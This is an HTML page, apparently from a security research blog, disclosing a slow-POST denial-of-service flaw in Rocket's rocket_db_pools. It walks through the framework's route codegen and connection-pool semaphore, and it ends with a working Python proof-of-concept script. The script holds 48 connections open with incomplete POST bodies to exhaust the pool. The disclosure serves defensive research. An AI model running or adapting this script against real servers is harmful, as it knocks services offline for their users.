@@ -1,0 +1,260 @@
+<!doctype html> <html lang=en > <meta charset=UTF-8 > <meta name=viewport  content="width=device-width, initial-scale=1"> <link rel=stylesheet  href="/wednesday/libs/highlight/styles/base16/chalk.min.css" /> <link rel=stylesheet  href="/wednesday/css/franklin.css" /> <link rel=stylesheet  href="/wednesday/css/tufte.css" /> <link rel=stylesheet  href="/wednesday/css/latex.css" /> <link rel=stylesheet  href="/wednesday/css/adjust.css" /> <link rel=icon  href="/wednesday/assets/favicon.png" /> <title>DB Connection Pool DoS in rocket.rs</title> <div id=layout > <div id=menu > <ul> <li><a href="/wednesday/">home</a> <li><a href="/wednesday/about/">about</a> <li><a href="/wednesday/ctf/">ctf</a> <li><a href="/wednesday/research/">research</a> </ul> </div> <div id=main ></div> </div> <div class=franklin-content ><h1 id=db_connection_pool_dos_in_rocketrs ><a href="#db_connection_pool_dos_in_rocketrs" class=header-anchor >DB Connection Pool DoS in rocket.rs</a></h1> <p>Web applications written in <a href="https://rocket.rs">Rocket</a> are susceptible to a slow-POST DoS when using the <a href="https://api.rocket.rs/v0.5/rocket_db_pools/"><code>rocket_db_pools</code></a> feature to manage database connections. Under Rocket&#39;s &#39;sane default&#39; configuration for release builds, resource exhaustion occurs once <code>num_cpus * 4</code> simultaneous connections are made. In particular, this limit is much lower than the HTTP thread pool size of most modern servers.</p> <p>The <code>rocket_db_pools</code> feature is Rocket&#39;s builtin, ORM-agnostic support for database connections. This feature simplifies accessing one or more databases via connection pools: data structures that maintain active database connections for use in each request. These connection pools are the <a href="https://rocket.rs/guide/v0.5/state/#databases">idiomatic</a> method for database interaction within Rocket, and are widely used by Rocket applications.</p> <h4 id=background_on_rockets_codegen ><a href="#background_on_rockets_codegen" class=header-anchor >Background on Rocket&#39;s codegen</a></h4> <p>A route in Rocket typically looks like this:</p> <pre><code class="rust hljs"><span class=hljs-meta >#[post(<span class=hljs-string >&quot;/&quot;</span>, data = <span class=hljs-string >&quot;&lt;post&gt;&quot;</span>)]</span>
+<span class=hljs-keyword >async</span> <span class=hljs-keyword >fn</span> <span class="hljs-title function_">create</span>(<span class=hljs-keyword >mut</span> db: Connection&lt;Db&gt;, <span class=hljs-keyword >mut</span> post: Json&lt;Post&gt;) <span class=hljs-punctuation >-&gt;</span> <span class=hljs-type >Result</span>&lt;Created&lt;Json&lt;Post&gt;&gt;&gt; {
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >results</span> = sqlx::query!(
+            <span class=hljs-string >&quot;INSERT INTO posts (title, text) VALUES (?, ?) RETURNING id&quot;</span>,
+            post.title, post.text
+        )
+        .<span class="hljs-title function_ invoke__">fetch</span>(&amp;<span class=hljs-keyword >mut</span> **db)
+        .try_collect::&lt;<span class=hljs-type >Vec</span>&lt;_&gt;&gt;()
+        .<span class=hljs-keyword >await</span>?;
+
+    post.id = <span class="hljs-title function_ invoke__">Some</span>(results.<span class="hljs-title function_ invoke__">first</span>().<span class="hljs-title function_ invoke__">expect</span>(<span class=hljs-string >&quot;returning results&quot;</span>).id);
+    <span class="hljs-title function_ invoke__">Ok</span>(Created::<span class="hljs-title function_ invoke__">new</span>(<span class=hljs-string >&quot;/&quot;</span>).<span class="hljs-title function_ invoke__">body</span>(post))
+}</code></pre> <p>The <code>#post</code> annotation expands into the <code>route_attribute&#33;</code> macro, which parses the function definition into a generic handler for HTTP requests.</p> <pre><code class="rust hljs"><span class=hljs-keyword >pub</span> <span class=hljs-keyword >fn</span> <span class="hljs-title function_">route_attribute</span>&lt;M: <span class=hljs-built_in >Into</span>&lt;<span class=hljs-type >Option</span>&lt;crate::http::Method&gt;&gt;&gt;(
+    method: M,
+    args: proc_macro::TokenStream,
+    input: proc_macro::TokenStream
+) <span class=hljs-punctuation >-&gt;</span> TokenStream {
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >result</span> = <span class=hljs-keyword >match</span> method.<span class="hljs-title function_ invoke__">into</span>() {
+        <span class="hljs-title function_ invoke__">Some</span>(method) =&gt; <span class="hljs-title function_ invoke__">incomplete_route</span>(method, args.<span class="hljs-title function_ invoke__">into</span>(), input.<span class="hljs-title function_ invoke__">into</span>()),
+        <span class=hljs-literal >None</span> =&gt; <span class="hljs-title function_ invoke__">complete_route</span>(args.<span class="hljs-title function_ invoke__">into</span>(), input.<span class="hljs-title function_ invoke__">into</span>())
+    };
+
+    result.<span class="hljs-title function_ invoke__">unwrap_or_else</span>(|diag| diag.<span class="hljs-title function_ invoke__">emit_as_item_tokens</span>())
+}</code></pre> <p>Both <code>incomplete_route</code> and <code>complete_route</code> then call into <code>codegen_route</code>, which constructs the handler function from the supplied parameters.</p> <pre><code class="rust hljs"><span class=hljs-keyword >fn</span> <span class="hljs-title function_">codegen_route</span>(route: Route) <span class=hljs-punctuation >-&gt;</span> <span class=hljs-type >Result</span>&lt;TokenStream&gt; {
+    <span class=hljs-keyword >use</span> crate::exports::*;
+
+    <span class=hljs-comment >// Generate the declarations for all of the guards.</span>
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >request_guards</span> = route.request_guards.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">map</span>(request_guard_decl);
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >param_guards</span> = route.<span class="hljs-title function_ invoke__">param_guards</span>().<span class="hljs-title function_ invoke__">map</span>(param_guard_decl);
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >query_guards</span> = <span class="hljs-title function_ invoke__">query_decls</span>(&amp;route);
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >data_guard</span> = route.data_guard.<span class="hljs-title function_ invoke__">as_ref</span>().<span class="hljs-title function_ invoke__">map</span>(data_guard_decl);
+
+    <span class=hljs-comment >// Extract the sentinels from the route.</span>
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >sentinels</span> = <span class="hljs-title function_ invoke__">sentinels_expr</span>(&amp;route);
+
+    <span class=hljs-comment >// Gather info about the function.</span>
+    <span class=hljs-keyword >let</span> (vis, handler_fn) = (&amp;route.handler.vis, &amp;route.handler);
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >deprecated</span> = handler_fn.attrs.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">find</span>(|a| a.<span class="hljs-title function_ invoke__">path</span>().<span class="hljs-title function_ invoke__">is_ident</span>(<span class=hljs-string >&quot;deprecated&quot;</span>));
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >handler_fn_name</span> = &amp;handler_fn.sig.ident;
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >internal_uri_macro</span> = <span class="hljs-title function_ invoke__">internal_uri_macro_decl</span>(&amp;route);
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >responder_outcome</span> = <span class="hljs-title function_ invoke__">responder_outcome_expr</span>(&amp;route);
+
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >method</span> = route.attr.method;
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >uri</span> = route.attr.uri.<span class="hljs-title function_ invoke__">to_string</span>();
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >rank</span> = <span class="hljs-title function_ invoke__">Optional</span>(route.attr.rank);
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >format</span> = <span class="hljs-title function_ invoke__">Optional</span>(route.attr.format.<span class="hljs-title function_ invoke__">as_ref</span>());
+
+    <span class="hljs-title function_ invoke__">Ok</span>(quote! {
+        #handler_fn
+
+        <span class=hljs-meta >#[doc(hidden)]</span>
+        <span class=hljs-meta >#[allow(nonstandard_style)]</span>
+        <span class=hljs-comment >/// Rocket code generated proxy structure.</span>
+        #deprecated #vis <span class=hljs-keyword >struct</span> #handler_fn_name {  }
+
+        <span class=hljs-comment >/// Rocket code generated proxy static conversion implementations.</span>
+        <span class=hljs-meta >#[allow(nonstandard_style, deprecated, clippy::style)]</span>
+        <span class=hljs-keyword >impl</span> #handler_fn_name {
+            <span class=hljs-keyword >fn</span> <span class="hljs-title function_">into_info</span>(<span class=hljs-keyword >self</span>) <span class=hljs-punctuation >-&gt;</span> #_route::StaticInfo {
+                <span class=hljs-keyword >fn</span> <span class="hljs-title function_">monomorphized_function</span>&lt;<span class=hljs-symbol >&#x27;__r</span>&gt;(
+                    #__req: &amp;<span class=hljs-symbol >&#x27;__r</span> #Request&lt;<span class=hljs-symbol >&#x27;_</span>&gt;,
+                    #__data: #Data&lt;<span class=hljs-symbol >&#x27;__r</span>&gt;
+                ) <span class=hljs-punctuation >-&gt;</span> #_route::BoxFuture&lt;<span class=hljs-symbol >&#x27;__r</span>&gt; {
+                    #_<span class=hljs-type >Box</span>::<span class="hljs-title function_ invoke__">pin</span>(<span class=hljs-keyword >async</span> <span class=hljs-keyword >move</span> {
+                        #(#request_guards)*
+                        #(#param_guards)*
+                        #query_guards
+                        #data_guard
+
+                        #responder_outcome
+                    })
+                }
+
+                #_route::StaticInfo {
+                    name: <span class=hljs-built_in >stringify!</span>(#handler_fn_name),
+                    method: #method,
+                    uri: #uri,
+                    handler: monomorphized_function,
+                    format: #format,
+                    rank: #rank,
+                    sentinels: #sentinels,
+                }
+            }
+
+            <span class=hljs-meta >#[doc(hidden)]</span>
+            <span class=hljs-keyword >pub</span> <span class=hljs-keyword >fn</span> <span class="hljs-title function_">into_route</span>(<span class=hljs-keyword >self</span>) <span class=hljs-punctuation >-&gt;</span> #Route {
+                <span class=hljs-keyword >self</span>.<span class="hljs-title function_ invoke__">into_info</span>().<span class="hljs-title function_ invoke__">into</span>()
+            }
+        }
+
+        <span class=hljs-comment >/// Rocket code generated wrapping URI macro.</span>
+        #internal_uri_macro
+    })
+}</code></pre> <p>The block we&#39;re particularly interested in is the instantiation of request guards:</p> <pre><code class="rust hljs"><span class=hljs-comment >// Generate the declarations for all of the guards.</span>
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >request_guards</span> = route.request_guards.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">map</span>(request_guard_decl);
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >param_guards</span> = route.<span class="hljs-title function_ invoke__">param_guards</span>().<span class="hljs-title function_ invoke__">map</span>(param_guard_decl);
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >query_guards</span> = <span class="hljs-title function_ invoke__">query_decls</span>(&amp;route);
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >data_guard</span> = route.data_guard.<span class="hljs-title function_ invoke__">as_ref</span>().<span class="hljs-title function_ invoke__">map</span>(data_guard_decl);</code></pre> <p>Within Rocket, <a href="https://rocket.rs/guide/v0.5/requests/#requests">request guards</a> is a dependency injection-esque middlware/auth feature, which protects a handler from being called erroneously based on information in an incoming request. Each request guard represents an arbitrary validation policy which is implemented through the <code>FromRequest</code> trait. This trait has one method <code>from_request&#40;request: &amp;&#39;r Request&#39;&#41; -&gt; Outcome&lt;Self, Self::Error&gt;</code>, which receives an object containing the request&#39;s header block, and returns either an object representing the validated data, or raises an error to deny this the request.</p> <p>In addition to performing data validatin, request guards are also overloaded to service the <code>rocket_db_pools</code> feature. Going back to our route, we see that it receives in its arguments a value of type <code>Connection</code>:</p> <pre><code class="rust hljs"><span class=hljs-meta >#[post(<span class=hljs-string >&quot;/&quot;</span>, data = <span class=hljs-string >&quot;&lt;post&gt;&quot;</span>)]</span>
+<span class=hljs-keyword >async</span> <span class=hljs-keyword >fn</span> <span class="hljs-title function_">create</span>(<span class=hljs-keyword >mut</span> db: Connection&lt;Db&gt;, <span class=hljs-keyword >mut</span> post: Json&lt;Post&gt;) <span class=hljs-punctuation >-&gt;</span> <span class=hljs-type >Result</span>&lt;Created&lt;Json&lt;Post&gt;&gt;&gt; {
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >results</span> = sqlx::query!(
+            <span class=hljs-string >&quot;INSERT INTO posts (title, text) VALUES (?, ?) RETURNING id&quot;</span>,
+            post.title, post.text
+        )
+        .<span class="hljs-title function_ invoke__">fetch</span>(&amp;<span class=hljs-keyword >mut</span> **db)
+        .try_collect::&lt;<span class=hljs-type >Vec</span>&lt;_&gt;&gt;()
+        .<span class=hljs-keyword >await</span>?;
+
+    post.id = <span class="hljs-title function_ invoke__">Some</span>(results.<span class="hljs-title function_ invoke__">first</span>().<span class="hljs-title function_ invoke__">expect</span>(<span class=hljs-string >&quot;returning results&quot;</span>).id);
+    <span class="hljs-title function_ invoke__">Ok</span>(Created::<span class="hljs-title function_ invoke__">new</span>(<span class=hljs-string >&quot;/&quot;</span>).<span class="hljs-title function_ invoke__">body</span>(post))
+}</code></pre> <p><code>Connection&lt;Db&gt;</code> is a request guard, and its implementation of <code>FromRequest</code> looks like this:</p> <pre><code class="rust hljs"><span class=hljs-keyword >async</span> <span class=hljs-keyword >fn</span> <span class="hljs-title function_">from_request</span>(req: &amp;<span class=hljs-symbol >&#x27;r</span> Request&lt;<span class=hljs-symbol >&#x27;_</span>&gt;) <span class=hljs-punctuation >-&gt;</span> Outcome&lt;<span class=hljs-keyword >Self</span>, <span class=hljs-keyword >Self</span>::Error&gt; {
+    <span class=hljs-keyword >match</span> D::<span class="hljs-title function_ invoke__">fetch</span>(req.<span class="hljs-title function_ invoke__">rocket</span>()) {
+        <span class="hljs-title function_ invoke__">Some</span>(db) =&gt; <span class=hljs-keyword >match</span> db.<span class="hljs-title function_ invoke__">get</span>().<span class=hljs-keyword >await</span> {
+            <span class="hljs-title function_ invoke__">Ok</span>(conn) =&gt; Outcome::<span class="hljs-title function_ invoke__">Success</span>(<span class="hljs-title function_ invoke__">Connection</span>(conn)),
+            <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; Outcome::<span class="hljs-title function_ invoke__">Error</span>((Status::ServiceUnavailable, <span class="hljs-title function_ invoke__">Some</span>(e))),
+    },
+        <span class=hljs-literal >None</span> =&gt; Outcome::<span class="hljs-title function_ invoke__">Error</span>((Status::InternalServerError, <span class=hljs-literal >None</span>)),
+    }
+}</code></pre> <p>The implementation fetches the application&#39;s connection manager using <code>D::fetch</code>, and then calls the <code>get&#40;&#41;</code> method on the connection manager. The <code>get&#40;&#41;</code> method then forwards to <code>timeout_get&#40;&#41;</code>:</p> <pre><code class="rust hljs"><span class=hljs-keyword >pub</span> <span class=hljs-keyword >async</span> <span class=hljs-keyword >fn</span> <span class="hljs-title function_">timeout_get</span>(&amp;<span class=hljs-keyword >self</span>, timeouts: &amp;Timeouts) <span class=hljs-punctuation >-&gt;</span> <span class=hljs-type >Result</span>&lt;W, PoolError&lt;M::Error&gt;&gt; {
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >_</span> = <span class=hljs-keyword >self</span>.inner.users.<span class="hljs-title function_ invoke__">fetch_add</span>(<span class=hljs-number >1</span>, Ordering::Relaxed);
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >users_guard</span> = <span class="hljs-title function_ invoke__">DropGuard</span>(|| {
+        <span class=hljs-keyword >let</span> <span class=hljs-variable >_</span> = <span class=hljs-keyword >self</span>.inner.users.<span class="hljs-title function_ invoke__">fetch_sub</span>(<span class=hljs-number >1</span>, Ordering::Relaxed);
+    });
+
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >non_blocking</span> = <span class=hljs-keyword >match</span> timeouts.wait {
+        <span class="hljs-title function_ invoke__">Some</span>(t) =&gt; t.<span class="hljs-title function_ invoke__">as_nanos</span>() == <span class=hljs-number >0</span>,
+        <span class=hljs-literal >None</span> =&gt; <span class=hljs-literal >false</span>,
+    };
+
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >permit</span> = <span class=hljs-keyword >if</span> non_blocking {
+        <span class=hljs-keyword >self</span>.inner.semaphore.<span class="hljs-title function_ invoke__">try_acquire</span>().<span class="hljs-title function_ invoke__">map_err</span>(|e| <span class=hljs-keyword >match</span> e {
+            TryAcquireError::Closed =&gt; PoolError::Closed,
+            TryAcquireError::NoPermits =&gt; PoolError::<span class="hljs-title function_ invoke__">Timeout</span>(TimeoutType::Wait),
+        })?
+    } <span class=hljs-keyword >else</span> {
+        <span class="hljs-title function_ invoke__">apply_timeout</span>(
+            <span class=hljs-keyword >self</span>.inner.runtime,
+            TimeoutType::Wait,
+            timeouts.wait,
+            <span class=hljs-keyword >async</span> {
+                <span class=hljs-keyword >self</span>.inner
+                    .semaphore
+                    .<span class="hljs-title function_ invoke__">acquire</span>()
+                    .<span class=hljs-keyword >await</span>
+                    .<span class="hljs-title function_ invoke__">map_err</span>(|_| PoolError::Closed)
+            },
+        )
+        .<span class=hljs-keyword >await</span>?
+    };
+
+    <span class=hljs-keyword >let</span> <span class=hljs-variable >inner_obj</span> = <span class=hljs-keyword >loop</span> {
+        <span class=hljs-keyword >let</span> <span class=hljs-variable >inner_obj</span> = <span class=hljs-keyword >match</span> <span class=hljs-keyword >self</span>.inner.config.queue_mode {
+            QueueMode::Fifo =&gt; <span class=hljs-keyword >self</span>.inner.slots.<span class="hljs-title function_ invoke__">lock</span>().<span class="hljs-title function_ invoke__">unwrap</span>().vec.<span class="hljs-title function_ invoke__">pop_front</span>(),
+            QueueMode::Lifo =&gt; <span class=hljs-keyword >self</span>.inner.slots.<span class="hljs-title function_ invoke__">lock</span>().<span class="hljs-title function_ invoke__">unwrap</span>().vec.<span class="hljs-title function_ invoke__">pop_back</span>(),
+        };
+        <span class=hljs-keyword >let</span> <span class=hljs-variable >inner_obj</span> = <span class=hljs-keyword >if</span> <span class=hljs-keyword >let</span> <span class=hljs-variable >Some</span>(inner_obj) = inner_obj {
+            <span class=hljs-keyword >self</span>.<span class="hljs-title function_ invoke__">try_recycle</span>(timeouts, inner_obj).<span class=hljs-keyword >await</span>?
+        } <span class=hljs-keyword >else</span> {
+            <span class=hljs-keyword >self</span>.<span class="hljs-title function_ invoke__">try_create</span>(timeouts).<span class=hljs-keyword >await</span>?
+        };
+        <span class=hljs-keyword >if</span> <span class=hljs-keyword >let</span> <span class=hljs-variable >Some</span>(inner_obj) = inner_obj {
+            <span class=hljs-keyword >break</span> inner_obj;
+        }
+    };
+
+    users_guard.<span class="hljs-title function_ invoke__">disarm</span>();
+    permit.forget();
+
+    <span class="hljs-title function_ invoke__">Ok</span>(Object {
+        inner: <span class="hljs-title function_ invoke__">Some</span>(inner_obj),
+        pool: <span class=hljs-keyword >self</span>.<span class="hljs-title function_ invoke__">weak</span>(),
+    }
+    .<span class="hljs-title function_ invoke__">into</span>())
+}</code></pre> <p>The main action of interest within <code>timeout_get</code> is the section where a database connection is reserved by decrementing a semaphore:</p> <pre><code class="rust hljs"><span class=hljs-keyword >let</span> <span class=hljs-variable >permit</span> = <span class=hljs-keyword >if</span> non_blocking {
+        <span class=hljs-keyword >self</span>.inner.semaphore.<span class="hljs-title function_ invoke__">try_acquire</span>().<span class="hljs-title function_ invoke__">map_err</span>(|e| <span class=hljs-keyword >match</span> e {
+            TryAcquireError::Closed =&gt; PoolError::Closed,
+            TryAcquireError::NoPermits =&gt; PoolError::<span class="hljs-title function_ invoke__">Timeout</span>(TimeoutType::Wait),
+        })?
+    } <span class=hljs-keyword >else</span> {
+        <span class="hljs-title function_ invoke__">apply_timeout</span>(
+            <span class=hljs-keyword >self</span>.inner.runtime,
+            TimeoutType::Wait,
+            timeouts.wait,
+            <span class=hljs-keyword >async</span> {
+                <span class=hljs-keyword >self</span>.inner
+                    .semaphore
+                    .<span class="hljs-title function_ invoke__">acquire</span>()
+                    .<span class=hljs-keyword >await</span>
+                    .<span class="hljs-title function_ invoke__">map_err</span>(|_| PoolError::Closed)
+            },
+        )
+        .<span class=hljs-keyword >await</span>?
+    };</code></pre> <p>This semaphore represents the number of connections available in the pool, and by default for release builds it is set to <code>num_cpus&#40;&#41; * 4</code>. Once decremented, the semaphore is not incremented again until the underlying database connection is dropped. This occurs only if the connection closes, or if the route handler finishes executing:</p> <pre><code class="rust hljs"><span class=hljs-keyword >impl</span>&lt;T&gt; <span class=hljs-built_in >Drop</span> <span class=hljs-keyword >for</span> <span class="hljs-title class_">Object</span>&lt;T&gt; {
+    <span class=hljs-keyword >fn</span> <span class="hljs-title function_">drop</span>(&amp;<span class=hljs-keyword >mut</span> <span class=hljs-keyword >self</span>) {
+        <span class=hljs-keyword >if</span> <span class=hljs-keyword >let</span> <span class=hljs-variable >Some</span>(obj) = <span class=hljs-keyword >self</span>.obj.<span class="hljs-title function_ invoke__">take</span>() {
+            <span class=hljs-keyword >if</span> <span class=hljs-keyword >let</span> <span class=hljs-variable >Some</span>(pool) = <span class=hljs-keyword >self</span>.pool.<span class="hljs-title function_ invoke__">upgrade</span>() {
+                {
+                    <span class=hljs-keyword >let</span> <span class=hljs-keyword >mut </span><span class=hljs-variable >queue</span> = pool.queue.<span class="hljs-title function_ invoke__">lock</span>().<span class="hljs-title function_ invoke__">unwrap</span>();
+                    queue.<span class="hljs-title function_ invoke__">push</span>(obj);
+                }
+                <span class=hljs-keyword >let</span> <span class=hljs-variable >_</span> = pool.available.<span class="hljs-title function_ invoke__">fetch_add</span>(<span class=hljs-number >1</span>, Ordering::Relaxed);
+                pool.semaphore.<span class="hljs-title function_ invoke__">add_permits</span>(<span class=hljs-number >1</span>);
+                pool.<span class="hljs-title function_ invoke__">clean_up</span>();
+            }
+        }
+    }
+}</code></pre> <p>So now, going back to our macro expansion block we see that the first line which instantiates the request guards will acquire a permit for a database connection and hold on to it for the duration of the request:</p> <pre><code class="rust hljs"><span class=hljs-keyword >let</span> <span class=hljs-variable >request_guards</span> = route.request_guards.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">map</span>(request_guard_decl);
+<span class=hljs-keyword >let</span> <span class=hljs-variable >param_guards</span> = route.<span class="hljs-title function_ invoke__">param_guards</span>().<span class="hljs-title function_ invoke__">map</span>(param_guard_decl);
+<span class=hljs-keyword >let</span> <span class=hljs-variable >query_guards</span> = <span class="hljs-title function_ invoke__">query_decls</span>(&amp;route);
+<span class=hljs-keyword >let</span> <span class=hljs-variable >data_guard</span> = route.data_guard.<span class="hljs-title function_ invoke__">as_ref</span>().<span class="hljs-title function_ invoke__">map</span>(data_guard_decl);</code></pre> <p>The last line instantiates the data guard, which is responsible for deserializing the request body and passing it to the handler. This is done for each type via the <code>FromData</code> trait. A prototypical implementation is the for arbitrary JSON deserialization:</p> <pre><code class="rust hljs"><span class=hljs-keyword >impl</span>&lt;<span class=hljs-symbol >&#x27;r</span>, T: Deserialize&lt;<span class=hljs-symbol >&#x27;r</span>&gt;&gt; Json&lt;T&gt; {
+    <span class=hljs-keyword >fn</span> <span class="hljs-title function_">from_str</span>(s: &amp;<span class=hljs-symbol >&#x27;r</span> <span class=hljs-type >str</span>) <span class=hljs-punctuation >-&gt;</span> <span class=hljs-type >Result</span>&lt;<span class=hljs-keyword >Self</span>, Error&lt;<span class=hljs-symbol >&#x27;r</span>&gt;&gt; {
+        serde_json::<span class="hljs-title function_ invoke__">from_str</span>(s).<span class="hljs-title function_ invoke__">map</span>(Json).<span class="hljs-title function_ invoke__">map_err</span>(|e| Error::<span class="hljs-title function_ invoke__">Parse</span>(s, e))
+    }
+
+    <span class=hljs-keyword >async</span> <span class=hljs-keyword >fn</span> <span class="hljs-title function_">from_data</span>(req: &amp;<span class=hljs-symbol >&#x27;r</span> Request&lt;<span class=hljs-symbol >&#x27;_</span>&gt;, data: Data&lt;<span class=hljs-symbol >&#x27;r</span>&gt;) <span class=hljs-punctuation >-&gt;</span> <span class=hljs-type >Result</span>&lt;<span class=hljs-keyword >Self</span>, Error&lt;<span class=hljs-symbol >&#x27;r</span>&gt;&gt; {
+        <span class=hljs-keyword >let</span> <span class=hljs-variable >limit</span> = req.<span class="hljs-title function_ invoke__">limits</span>().<span class="hljs-title function_ invoke__">get</span>(<span class=hljs-string >&quot;json&quot;</span>).<span class="hljs-title function_ invoke__">unwrap_or</span>(Limits::JSON);
+        <span class=hljs-keyword >let</span> <span class=hljs-variable >string</span> = <span class=hljs-keyword >match</span> data.<span class="hljs-title function_ invoke__">open</span>(limit).<span class="hljs-title function_ invoke__">into_string</span>().<span class=hljs-keyword >await</span> {
+            <span class="hljs-title function_ invoke__">Ok</span>(s) <span class=hljs-keyword >if</span> s.<span class="hljs-title function_ invoke__">is_complete</span>() =&gt; s.<span class="hljs-title function_ invoke__">into_inner</span>(),
+            <span class="hljs-title function_ invoke__">Ok</span>(_) =&gt; {
+                <span class=hljs-keyword >let</span> <span class=hljs-variable >eof</span> = io::ErrorKind::UnexpectedEof;
+                <span class=hljs-keyword >return</span> <span class="hljs-title function_ invoke__">Err</span>(Error::<span class="hljs-title function_ invoke__">Io</span>(io::Error::<span class="hljs-title function_ invoke__">new</span>(eof, <span class=hljs-string >&quot;data limit exceeded&quot;</span>)));
+            },
+            <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; <span class=hljs-keyword >return</span> <span class="hljs-title function_ invoke__">Err</span>(Error::<span class="hljs-title function_ invoke__">Io</span>(e)),
+        };
+
+        <span class=hljs-keyword >Self</span>::<span class="hljs-title function_ invoke__">from_str</span>(local_cache!(req, string))
+    }
+}</code></pre> <p>This implementation calls <code>data.open</code>, which calls into <code>DataStream::new</code>, then <code>DataStream::Base::take</code>, which reads from an input stream asynchronously. Since no timeout is specified on this operation, if the HTTP body is incomplete, the runtime will wait indefinitely for data while yielding execution for other requests.</p> <p>To summarise then, in each request we have:</p> <pre><code class="rust hljs"><span class=hljs-comment >// instantiate request guards. this decrements the connection pool semaphore.</span>
+<span class=hljs-keyword >let</span> <span class=hljs-variable >request_guards</span> = route.request_guards.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">map</span>(request_guard_decl);
+<span class=hljs-keyword >let</span> <span class=hljs-variable >param_guards</span> = route.<span class="hljs-title function_ invoke__">param_guards</span>().<span class="hljs-title function_ invoke__">map</span>(param_guard_decl);
+<span class=hljs-keyword >let</span> <span class=hljs-variable >query_guards</span> = <span class="hljs-title function_ invoke__">query_decls</span>(&amp;route);
+<span class=hljs-comment >// deserialize the request body. this will wait forever if the body is incomplete</span>
+<span class=hljs-comment >// all this time, we&#x27;re still holding a permit from the connection pool semaphore</span>
+<span class=hljs-keyword >let</span> <span class=hljs-variable >data_guard</span> = route.data_guard.<span class="hljs-title function_ invoke__">as_ref</span>().<span class="hljs-title function_ invoke__">map</span>(data_guard_decl);</code></pre> <p>So once the initial pool of connections gets exhausted &#40;e.g 12 cores &#61; 48 simultaneous connections by default&#41;, then no other requests requiring a database connection will succeed.</p> <h4 id=proof_of_concept ><a href="#proof_of_concept" class=header-anchor >Proof of Concept</a></h4> <p>This script executes a DoS attack on Rotki&#39;s reference implementation of <a href="https://github.com/rwf2/Rocket/tree/master/examples/databases.">database connections</a>.</p> <pre><code class="py hljs"><span class=hljs-comment >#!/usr/bin/env python3</span>
+<span class=hljs-keyword >import</span> ssl
+<span class=hljs-keyword >import</span> time
+<span class=hljs-keyword >from</span> tqdm <span class=hljs-keyword >import</span> tqdm
+<span class=hljs-keyword >from</span> pwn <span class=hljs-keyword >import</span> *
+context.log_level = <span class=hljs-string >&quot;debug&quot;</span>
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">main</span>():
+    <span class=hljs-comment ># Default DB connection pool is equal to number of CPUs * 4</span>
+    <span class=hljs-comment ># So resource exhaustion occurs at 48 simultaneous connections</span>
+    <span class=hljs-keyword >for</span> conn_num <span class=hljs-keyword >in</span> tqdm(<span class=hljs-built_in >range</span>(<span class=hljs-number >48</span>)):
+        conn = connect(<span class=hljs-string >&quot;rocket.local&quot;</span>, <span class=hljs-number >8000</span>)
+        conn.send(
+            (
+                <span class=hljs-string >&quot;POST /sqlx HTTP/1.1\r\n&quot;</span>
+                + <span class=hljs-string >&quot;Host: rocket.local\r\n&quot;</span>
+                + <span class=hljs-string >&quot;Content-Type: application/json\r\n&quot;</span>
+                + <span class=hljs-string >&quot;Content-Length: 20\r\n&quot;</span>
+                + <span class=hljs-string >&quot;\r\n\r\n&quot;</span>
+                + <span class=hljs-string >&#x27;{&quot;title&quot;:&quot;asdf&quot;&#x27;</span>
+            ).encode()
+        )
+    <span class=hljs-keyword >while</span> <span class=hljs-literal >True</span>:
+        <span class=hljs-keyword >pass</span>
+
+
+<span class=hljs-keyword >if</span> __name__ == <span class=hljs-string >&quot;__main__&quot;</span>:
+    main()</code></pre> </div> </div> </div> <script src="/wednesday/libs/highlight/highlight.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script> <script src="/wednesday/libs/highlight/rust.min.js"></script> <script src="/wednesday/libs/highlight/csharp.min.js"></script> <script> hljs.highlightAll(); hljs.configure({ tabReplace: " " }); </script>
